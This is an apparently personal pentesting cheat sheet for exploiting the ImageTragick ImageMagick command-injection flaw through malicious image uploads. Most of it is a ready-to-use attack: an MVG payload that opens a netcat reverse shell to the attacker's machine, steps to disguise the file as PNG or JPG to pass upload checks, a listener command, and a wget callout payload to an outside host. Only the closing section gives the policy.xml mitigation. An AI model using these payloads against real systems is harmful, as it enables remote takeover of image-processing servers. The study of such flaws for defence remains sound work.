# Exploiting ImageTragick
https://imagetragick.com/ for more details and other exploits for image uploads
## Create a Reverse Shell
```
nano rev.mvg
```
paste in the following lines:
```
push graphic-context

viewbox 0 0 640 480

fill ‘url(https://example.com/image.jpg”|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc 192.168.137.108 4444 1>/tmp/pipez;rm -rf “/tmp/pipez)’

pop graphic-context
```
**Change the IP address and Port number called by NetCat (nc) to match you attacking machine.**


# Bypass File Type Checks:
to bypass file type checks convert the file to a png or jpg file. 
## Convert to PNG
```
Convert exploit.mvg exploit.png
```

## Convert to JPG
```
Convert exploit.mvg exploit.jpg
```

# Get Reverse Shell
## Start Listener On Attack Machine:
```
nc -nvvlp 4444
```

## Upload file
upload the malicious png or jpg file and check to see if it contacts your NetCat listener. 


# Wget command
taken from: https://hackerone.com/reports/135072

Upload the following ASCII file as x.gif 
This will execute the wget command and makes an HTTP request to 1.2.3.4 on port 1337.
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```

# Harmless POC:
create harmless POC to run "ls -la" in the terminal
paste in the following lines:
```
push graphic-context
viewbox 0 0 640 480
fill ‘url(https://127.0.0.1/oops.jpg”|ls “-la)’
pop graphic-context
```

# How to fix it:
The ImageMagick team has shared the workaround for a vulnerable version without the need of updating the utility. The original post is published https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588 
It basically says you need to add following policies to your policy.xml file.
```
<policy domain=”coder” rights=”none” pattern=”EPHEMERAL” />
<policy domain=”coder” rights=”none” pattern=”HTTPS” />
<policy domain=”coder” rights=”none” pattern=”MVG” />
<policy domain=”coder” rights=”none” pattern=”MSL” />
<policy domain=”coder” rights=”none” pattern=”TEXT” />
<policy domain=”coder” rights=”none” pattern=”SHOW” />
<policy domain=”coder” rights=”none” pattern=”WIN” />
<policy domain=”coder” rights=”none” pattern=”PLT” />
```
